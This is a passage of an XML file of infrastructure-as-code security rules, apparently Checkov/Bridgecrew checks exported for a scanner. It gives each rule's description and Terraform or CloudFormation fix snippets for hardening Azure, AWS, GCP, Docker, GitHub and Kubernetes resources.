<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_mysql_server</li>
<li><strong>Argument</strong>:  ssl_minimal_tls_version_enforced</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mysql_server" "examplea" {
   ...
 + ssl_minimal_tls_version_enforced  = "TLS1_2"
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-mysql-is-using-the-latest-version-of-tls-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-mysql-is-using-the-latest-version-of-tls-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-mysql-is-using-the-latest-version-of-tls-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_125</key>
    <name>Ensure that Active Directory is used for Service Fabric authentication</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="active-directory-is-not-used-for-service-fabric-authentication"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-active-directory-is-not-used-for-service-fabric-authentication"></div>Active Directory is not used for Service Fabric authentication </div><a aria-label="Skip link to Active Directory is not used for Service Fabric authentication " class="heading-anchor-icon fa fa-anchor" href="#active-directory-is-not-used-for-service-fabric-authentication"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A Service Fabric cluster requires creating Azure Active Directory (AD) applications to control access to the cluster: one web application and one native application. After the applications are created, you will be required to assign users to read-only and admin roles.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_service_fabric_cluster</li>
<li><strong>Argument:</strong> azure_active_directory - (Optional) An azure_active_directory block as defined below.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_service_fabric_cluster" "example" {
  ...
  + azure_active_directory {
  +     tenant_id = "tenant"
  }
  ...
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-active-directory-is-used-for-service-fabric-authentication' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-active-directory-is-used-for-service-fabric-authentication</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-active-directory-is-used-for-service-fabric-authentication' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_7</key>
    <name>Ensure the base image uses a non latest version tag</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="base-image-uses-a-latest-version-tag"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-base-image-uses-a-latest-version-tag"></div>Base image uses a latest version tag</div><a aria-label="Skip link to Base image uses a latest version tag" class="heading-anchor-icon fa fa-anchor" href="#base-image-uses-a-latest-version-tag"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When possible, it is recommended to pin the version for the base image in your Dockerfiles. There are a number of potential issues that may be caused when using the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">latest</code> tag. Since <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">latest</code> is the default tag when a tag is not specified, it does not automatically refer to the latest version of the image. This can lead to the use of outdated images and in the case of production deployments, using a dynamic version can cause unexpected behavior and difficulty in determining which version is being currently used. It is best practice to be specific as possible about what is running to make operations predictable and reliable</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-the-base-image-uses-a-non-latest-version-tag' target='_blank'> https://docs.bridgecrew.io/docs/ensure-the-base-image-uses-a-non-latest-version-tag</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-the-base-image-uses-a-non-latest-version-tag' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_8</key>
    <name>Ensure the last USER is not root</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="last-user-is-root"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-last-user-is-root"></div>Last USER is root</div><a aria-label="Skip link to Last USER is root" class="heading-anchor-icon fa fa-anchor" href="#last-user-is-root"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Docker containers by default run with the root privilege and so does the application that runs inside the container. This is a major concern from the security perspective because hackers can gain root access to the Docker host by hacking the application running inside the container.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-the-last-user-is-not-root' target='_blank'> https://docs.bridgecrew.io/docs/ensure-the-last-user-is-not-root</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-the-last-user-is-not-root' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_70</key>
    <name>Ensure the GKE Release Channel is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes-engine-cluster-not-using-release-channel-for-version-management"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes-engine-cluster-not-using-release-channel-for-version-management"></div>Kubernetes Engine cluster not using Release Channel for version management</div><a aria-label="Skip link to Kubernetes Engine cluster not using Release Channel for version management" class="heading-anchor-icon fa fa-anchor" href="#kubernetes-engine-cluster-not-using-release-channel-for-version-management"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The release channels allow organizations to better set their expectation of what is stable. GKE&#8217;s release channel options include &#8220;rapid,&#8221; &#8220;regular,&#8221; and &#8220;stable.&#8221; This allows you to opt for the alpha releases as part of the &#8220;rapid&#8221; option, &#8220;regular&#8221; for standard release needs and &#8220;stable&#8221; when the tried-and-tested version becomes available.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-the-gke-release-channel-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-the-gke-release-channel-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-the-gke-release-channel-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GIT_1</key>
    <name>Ensure GitHub repository is private</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-repository-is-not-private"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-repository-is-not-private"></div>GitHub repository is not private</div><a aria-label="Skip link to GitHub repository is not private" class="heading-anchor-icon fa fa-anchor" href="#github-repository-is-not-private"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When you create a  Cloud repository, you specify whether it's private or public, but you can also change this setting at any time.</p>
<p>If your repository is public, anyone can access and fork it.</p>
<p>If your repository is private, you can specify who exactly can access your repository and whether they can fork it.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-repository-is-private' target='_blank'> https://docs.bridgecrew.io/docs/ensure-repository-is-private</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-repository-is-private' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_49</key>
    <name>Ensure minimized wildcard use in Roles and ClusterRoles</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="wildcard-use-is-not-minimized-in-roles-and-clusterroles"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-wildcard-use-is-not-minimized-in-roles-and-cluster-roles"></div>Wildcard use is not minimized in Roles and ClusterRoles</div><a aria-label="Skip link to Wildcard use is not minimized in Roles and ClusterRoles" class="heading-anchor-icon fa fa-anchor" href="#wildcard-use-is-not-minimized-in-roles-and-clusterroles"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-minimized-wildcard-use-in-roles-and-clusterroles' target='_blank'> https://docs.bridgecrew.io/docs/ensure-minimized-wildcard-use-in-roles-and-clusterroles</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-minimized-wildcard-use-in-roles-and-clusterroles' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_156</key>
    <name>Ensure that Workspace root volumes are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="workspace-root-volumes-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-workspace-root-volumes-are-not-encrypted"></div>Workspace root volumes are not encrypted</div><a aria-label="Skip link to Workspace root volumes are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#workspace-root-volumes-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_workspaces_workspace</li>
<li><strong>Argument</strong>:  root_volume_encryption_enabled </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_workspaces_workspace" "pass" {
    ...
+ root_volume_encryption_enabled = true
    ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::WorkSpaces::Workspace</li>
<li><strong>Argument</strong>:  Properties.RootVolumeEncryptionEnabled </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::WorkSpaces::Workspace
    ...
  Properties: 
    ...
+   RootVolumeEncryptionEnabled: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-workspace-root-volumes-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-workspace-root-volumes-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-workspace-root-volumes-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_158</key>
    <name>Ensure that CloudWatch Log Group is encrypted by KMS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudwatch-log-groups-encrypted-using-default-encryption-key-instead-of-kms-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-watch-log-groups-encrypted-using-default-encryption-key-instead-of-kms-cmk"></div>CloudWatch Log groups encrypted using default encryption key instead of KMS CMK</div><a aria-label="Skip link to CloudWatch Log groups encrypted using default encryption key instead of KMS CMK" class="heading-anchor-icon fa fa-anchor" href="#cloudwatch-log-groups-encrypted-using-default-encryption-key-instead-of-kms-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Log group data requires mandatory encryption settings in CloudWatch Logs. Developers can optionally use AWS Key Management Service for this encryption. This approach has several limitations:</p>
<ul>
<li>If you revoke CloudWatch Logs access to an associated CMK or delete an associated CMK, your encrypted data in CloudWatch Logs can no longer be retrieved. </li>
<li>You cannot associate a CMK with a log group using the CloudWatch console.</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_cloudwatch_log_group</li>
<li><strong>Argument</strong>:  kms_key_id</li>
</ul>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>Resource's ARN should be used.</p></blockquote>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_cloudwatch_log_group" "pass" {
  ...
+ kms_key_id        = "someKey"
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::Logs::LogGroup</li>
<li><strong>Argument</strong>:  Properties.KmsKeyId</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::Logs::LogGroup
    Properties: 
      ...
+     KmsKeyId: "someKey"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-cloudwatch-log-group-is-encrypted-by-kms' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-cloudwatch-log-group-is-encrypted-by-kms</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-cloudwatch-log-group-is-encrypted-by-kms' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_159</key>
    <name>Ensure that Athena Workgroup is encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="athena-workgroup-is-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-athena-workgroup-is-not-encrypted"></div>Athena Workgroup is not encrypted</div><a aria-label="Skip link to Athena Workgroup is not encrypted" class="heading-anchor-icon fa fa-anchor" href="#athena-workgroup-is-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Athena workgroups support full server-side encryption for all data at rest which should be enabled.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_athena_workgroup</li>
<li><strong>Argument</strong>:  result_configuration.encryption_configuration</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_athena_workgroup" "test" {
    ...
+ configuration {
        ...
+   result_configuration {
+     output_location = "s3://mys3bucket"
+     encryption_configuration {
+       encryption_option = "SSE_KMS"
+       kms_key_arn       = "mykmsarn"
      }
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-athena-workgroup-is-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-athena-workgroup-is-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-athena-workgroup-is-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_160</key>
    <name>Ensure that Timestream database is encrypted with KMS CMK</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="timestream-database-is-not-encrypted-with-kms-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-timestream-database-is-not-encrypted-with-kms-cmk"></div>Timestream database is not encrypted with KMS CMK</div><a aria-label="Skip link to Timestream database is not encrypted with KMS CMK" class="heading-anchor-icon fa fa-anchor" href="#timestream-database-is-not-encrypted-with-kms-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Timestream encryption at rest provides enhanced security by encrypting all your data at rest using encryption keys stored in AWS Key Management Service (AWS KMS). This functionality helps reduce the operational burden and complexity involved in protecting sensitive data. With encryption at rest, you can build security-sensitive applications that meet strict encryption compliance and regulatory requirements.<br/>
AWS KMS is required for encryption at rest in Timestream. Using a customer managed key in KMS to encrypt your Timestream data is recommended, in order to have more control over the permissions and lifecycle of your keys, including the ability to have them automatically rotated on an annual basis.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_timestreamwrite_database</li>
<li><strong>Argument</strong>:  kms_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_timestreamwrite_database" "test" {
    ...
+ kms_key_id = var.kms_key_id
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::Timestream::Database</li>
<li><strong>Argument</strong>:  Properties.KmsKeyId</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::Timestream::Database
    Properties:
      ...
+     KmsKeyId: kms-key-id
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-timestream-database-is-encrypted-with-kms-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-timestream-database-is-encrypted-with-kms-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-timestream-database-is-encrypted-with-kms-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_CUSTOM_1</key>
    <name>Ensure GCP resources that support labels have Labels</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-resources-that-support-labels-do-not-have-labels"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-resources-that-support-labels-do-not-have-labels"></div>GCP resources that support labels do not have Labels</div><a aria-label="Skip link to GCP resources that support labels do not have Labels" class="heading-anchor-icon fa fa-anchor" href="#gcp-resources-that-support-labels-do-not-have-labels"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Many different types of GCP resources support labels. Labels allow you to add metadata to a resource to help identify ownership, perform cost / billing analysis, and to enrich a resource with other valuable information, such as descriptions and environment names. While there are many ways that labels can be used, we recommend you follow a labeling practice.</p>
<p>View Google's recommended labeling best practices <a href="https://cloud.google.com/compute/docs/labeling-resources" target="_self">here</a>.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">supported_resources</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="supported_resources">google_active_directory_domain
google_bigquery_dataset
google_bigquery_job
google_bigquery_table
google_bigtable_instance
google_cloud_identity_group
google_cloudfunctions_function
google_composer_environment
google_compute_disk
google_compute_image
google_compute_instance
google_compute_instance_from_template
google_compute_instance_template
google_compute_region_disk
google_compute_snapshot
google_dataflow_job
google_dataproc_cluster
google_dataproc_job
google_dns_managed_zone
google_eventarc_trigger
google_filestore_instance
google_game_services_game_server_cluster
google_game_services_game_server_config
google_game_services_game_server_deployment
google_game_services_realm
google_healthcare_consent_store
google_healthcare_dicom_store
google_healthcare_fhir_store
google_healthcare_hl7_v2_store
google_kms_crypto_key
google_ml_engine_model
google_monitoring_notification_channel
google_network_management_connectivity_test
google_notebooks_instance
google_project
google_pubsub_subscription
google_pubsub_topic
google_redis_instance
google_secret_manager_secret
google_spanner_instance
google_storage_bucket
google_tpu_node
google_workflows_workflow'
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>The example below shows how to label a security group in Terraform. The syntax is generally the same for any label-enabled resource type.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_storage_bucket" "auto-expire" {
  name          = "auto-expiring-bucket"
  location      = "US"
  force_destroy = true

+  label {
+    type = prod
  }
  
  lifecycle_rule {
    condition {
      age = 3
    }
    action {
      type = "Delete"
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-resources-that-suppot-labels-have-labels' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-resources-that-suppot-labels-have-labels</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-resources-that-suppot-labels-have-labels' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_133</key>
    <name>Ensure Front Door WAF prevents message lookup in Log4j2</name>
    <description>
